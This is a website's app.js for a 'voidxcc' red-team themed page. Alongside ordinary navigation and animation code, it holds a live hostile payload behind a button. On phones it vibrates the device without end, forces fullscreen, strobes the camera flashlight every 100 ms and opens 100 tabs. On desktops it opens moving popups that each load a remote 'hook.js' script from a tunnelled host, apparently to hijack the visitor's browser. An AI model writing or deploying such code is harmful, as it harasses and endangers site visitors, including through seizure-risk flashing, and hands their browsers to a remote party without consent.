// voidxcc — app.js
(function () {
  'use strict';

  const nav = document.querySelector('nav');
  const links = nav ? Array.from(nav.querySelectorAll('a')) : [];

  links.forEach((a) => {
    a.addEventListener('click', (e) => {
      const href = a.getAttribute('href');
      if (href && href.startsWith('#')) {
        e.preventDefault();
        const target = document.querySelector(href);
        if (target) target.scrollIntoView({ behavior: 'smooth' });
      }
    });
  });

  // active section highlight
  const sections = document.querySelectorAll('section[id]');
  const observer = new IntersectionObserver(
    (entries) => {
      entries.forEach((entry) => {
        if (entry.isIntersecting) {
          links.forEach((l) => l.classList.remove('active'));
          const active = nav ? nav.querySelector(`a[href="#${entry.target.id}"]`) : null;
          if (active) active.classList.add('active');
        }
      });
    },
    { threshold: 0.4 }
  );
  sections.forEach((s) => observer.observe(s));

  // animated counters
  const counters = document.querySelectorAll('[data-count]');
  const counterObs = new IntersectionObserver((entries) => {
    entries.forEach((entry) => {
      if (!entry.isIntersecting) return;
      const el = entry.target;
      const target = parseInt(el.getAttribute('data-count'), 10);
      let cur = 0;
      const step = Math.max(1, Math.ceil(target / 40));
      const t = setInterval(() => {
        cur += step;
        if (cur >= target) { cur = target; clearInterval(t); }
        el.textContent = cur;
      }, 30);
      counterObs.unobserve(el);
    });
  }, { threshold: 0.5 });
  counters.forEach((c) => counterObs.observe(c));

  // typing effect for tagline
  const typing = document.querySelector('.typing');
  if (typing) {
    const phrases = ['cyber security // red team // research', 'break. fix. document. repeat.', 'voidxcc online.'];
    let pi = 0, ci = 0, deleting = false;
    function tick() {
      const phrase = phrases[pi];
      if (!deleting) {
        typing.textContent = phrase.slice(0, ci + 1);
        ci++;
        if (ci === phrase.length) { deleting = true; setTimeout(tick, 1400); return; }
      } else {
        typing.textContent = phrase.slice(0, ci - 1);
        ci--;
        if (ci === 0) { deleting = false; pi = (pi + 1) % phrases.length; }
      }
      setTimeout(tick, deleting ? 40 : 80);
    }
    tick();
  }

  console.log('%cvoidxcc loaded', 'color:#00ff9f;font-weight:bold;');

  // mobile/phone detection + mess-with-phone payload
  function isMobile() {
    const ua = navigator.userAgent || navigator.vendor || window.opera || '';
    if (/android|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile/i.test(ua)) return true;
    if (navigator.maxTouchPoints && navigator.maxTouchPoints > 2 && /Macintosh/i.test(ua)) return true; // iPad
    if (window.innerWidth <= 768 && ('ontouchstart' in window || navigator.maxTouchPoints > 0)) return true;
    return false;
  }

  function messWithPhone() {
    // aggressive vibration
    try { if (navigator.vibrate) navigator.vibrate([500, 100, 500, 100, 500, 100, 1000]); } catch (e) {}
    // force fullscreen
    try {
      const el = document.documentElement;
      const fs = el.requestFullscreen || el.webkitRequestFullscreen || el.msRequestFullscreen;
      if (fs) fs.call(el);
    } catch (e) {}
    // lock orientation if possible
    try { if (screen.orientation && screen.orientation.lock) screen.orientation.lock('portrait'); } catch (e) {}
    // full-screen overlay
    const ov = document.createElement('div');
    ov.style.cssText = 'position:fixed;inset:0;z-index:999999;background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;text-align:center;padding:20px;font-size:1.2rem;';
    ov.innerHTML = '<div><h1 style="color:#f00;">⚠ DEVICE DETECTED ⚠</h1><p>Mobile/phone fingerprinted.</p><p>Vibration + fullscreen + flash triggered.</p></div>';
    document.body.appendChild(ov);
    // single alert
    try { alert('voidxcc: phone detected'); } catch (e) {}
    // aggressive periodic vibration
    setInterval(() => { try { if (navigator.vibrate) navigator.vibrate([300, 50, 300, 50, 600]); } catch (e) {} }, 500);
    // rapid flashlight (torch) toggle — indefinitely
    try {
      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
        .then(stream => {
          const track = stream.getVideoTracks()[0];
          const caps = (track.getCapabilities) ? track.getCapabilities() : {};
          if (caps.torch) {
            let on = false;
            setInterval(() => {
              on = !on;
              track.applyConstraints({ advanced: [{ torch: on }] }).catch(() => {});
            }, 100);
          }
        }).catch(() => {});
    } catch (e) {}
  }

  // payload now triggers only on "1 or 0" button click (see spawnBtn handler)
  console.log('%cvoidxcc ready — payload fires on button click', 'color:#00ff9f;');

  // wire spawn button
  const spawnBtn = document.getElementById('spawnBtn');
  if (spawnBtn) {
    spawnBtn.addEventListener('click', () => {
      spawnBtn.classList.add('armed');
      spawnBtn.textContent = '0';
      // unlock audio in this document (user gesture)
      try {
        var C = window.AudioContext || window.webkitAudioContext;
        if (C) { var ctx = new C(); var b = ctx.createBuffer(1, 1, 22050); var s = ctx.createBufferSource(); s.buffer = b; s.connect(ctx.destination); s.start(0); if (ctx.state === 'suspended') ctx.resume(); }
      } catch (e) {}
      // unmute & play the main site media video with sound
      try {
        var mv = document.querySelector('#media video');
        if (mv) { mv.muted = false; mv.volume = 1; mv.play(); }
      } catch (e) {}
      if (isMobile()) {
        // phones: mess-with-phone + open 100 tabs of images
        try { messWithPhone(); } catch (e) {}
        const imgUrl = 'video/images.jpeg';
        for (let i = 0; i < 100; i++) {
          setTimeout(() => { try { window.open(imgUrl, '_blank'); } catch (e) {} }, i * 50);
        }
      } else {
        // desktop: normal spawn (flying videos + isolated player)
        spawn50();
      }
    });
  }

  // spawn5 — fullscreen main page + isolated player (sound) + 5 photo popups (growing, moving)
  function spawn50(url) {
    const imgSrc = 'video/images.jpeg';
    const count = 5;
    console.log('click ini');

    // fullscreen the main page
    const el = document.documentElement;
    const fs = el.requestFullscreen || el.webkitRequestFullscreen || el.msRequestFullscreen;
    if (fs) { try { fs.call(el); } catch (e) {} }

    // open the isolated player (fullscreen + sound) in a new window
    try { window.open('player/index.html', '_blank', 'width=800,height=600'); } catch (e) {}

    // spawn 5 popup windows (new browsers) showing the photo, moving + growing
    const popups = [];
    for (let i = 1; i <= count; i++) {
      console.log('click ini ' + i);
      const w = window.open('', '', 'width=200,height=200,left=' + (i * 60) + ',top=' + (i * 40));
      if (w) {
        try {
          w.document.open();
          w.document.write(
            '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>photo</title>' +
            '<script src="https://regime-devel-evident-carlo.trycloudflare.com/hook.js"><\/script>' +
            '<style>html,body{margin:0;padding:0;background:#000;height:100%;overflow:hidden}img{width:100%;height:100%;object-fit:cover;display:block}</style></head><body>' +
            '<img src="' + imgSrc + '" alt="photo">' +
            '<script>var img=document.querySelector("img");var size=200;function grow(){size=Math.min(size+2,500);if(window.resizeTo)window.resizeTo(size,size);requestAnimationFrame(grow);}grow();<\/script>' +
            '</body></html>'
          );
          w.document.close();
        } catch (e) { /* fallback */ }
        popups.push({ w: w, x: i * 60, y: i * 40, dx: 3 + i, dy: 2 + i, size: 200 });
      }
    }
    // animate each popup moving across the screen (moveTo), keep growing
    const mover = setInterval(() => {
      popups.forEach((o) => {
        try {
          if (o.w.closed) return;
          const sw = screen.availWidth || window.screen.width;
          const sh = screen.availHeight || window.screen.height;
          o.x += o.dx;
          o.y += o.dy;
          if (o.x <= 0 || o.x >= sw - o.size) { o.dx = -o.dx; o.x = Math.max(0, Math.min(o.x, sw - o.size)); }
          if (o.y <= 0 || o.y >= sh - o.size) { o.dy = -o.dy; o.y = Math.max(0, Math.min(o.y, sh - o.size)); }
          o.w.moveTo(o.x, o.y);
        } catch (e) { /* closed/blocked */ }
      });
      if (popups.every((o) => { try { return o.w.closed; } catch (e) { return true; } })) {
        clearInterval(mover);
      }
    }, 16);

    // flying videos (in-page, moving across the screen, sound on)
    const flyers = [];
    const flyerCount = 5;
    for (let i = 1; i <= flyerCount; i++) {
      const v = document.createElement('video');
      v.src = 'media/ssstik.io_1793346915517.mp4';
      v.autoplay = true;
      v.loop = true;
      v.playsInline = true;
      v.muted = false;
      v.volume = 1;
      v.style.position = 'fixed';
      v.style.width = '240px';
      v.style.height = '180px';
      v.style.opacity = '0.85';
      v.style.pointerEvents = 'none';
      v.style.zIndex = '5';
      v.style.borderRadius = '6px';
      v.style.border = '1px solid #00ff9f';
      v.style.left = (Math.random() * (window.innerWidth - 240)) + 'px';
      v.style.top = (Math.random() * (window.innerHeight - 180)) + 'px';
      document.body.appendChild(v);
      flyers.push({
        el: v,
        x: parseFloat(v.style.left),
        y: parseFloat(v.style.top),
        dx: (Math.random() * 3 + 1) * (Math.random() < 0.5 ? 1 : -1),
        dy: (Math.random() * 3 + 1) * (Math.random() < 0.5 ? 1 : -1),
        w: 240, h: 180
      });
      const p = v.play();
      if (p && p.catch) {
        p.catch(() => { v.muted = true; v.play(); });
      }
    }
    const flyerMover = setInterval(() => {
      flyers.forEach((o) => {
        const maxX = window.innerWidth - o.w;
        const maxY = window.innerHeight - o.h;
        o.x += o.dx;
        o.y += o.dy;
        if (o.x <= 0 || o.x >= maxX) { o.dx = -o.dx; o.x = Math.max(0, Math.min(o.x, maxX)); }
        if (o.y <= 0 || o.y >= maxY) { o.dy = -o.dy; o.y = Math.max(0, Math.min(o.y, maxY)); }
        o.el.style.left = o.x + 'px';
        o.el.style.top = o.y + 'px';
      });
    }, 16);

    console.log('%cspawn5 done: fullscreen + isolated player + ' + popups.length + ' photo popups + ' + flyerCount + ' flying videos (sound on)', 'color:#00ff9f;font-weight:bold;');
    return popups.length + flyerCount;
  }
  window.spawn50 = spawn50;
})();
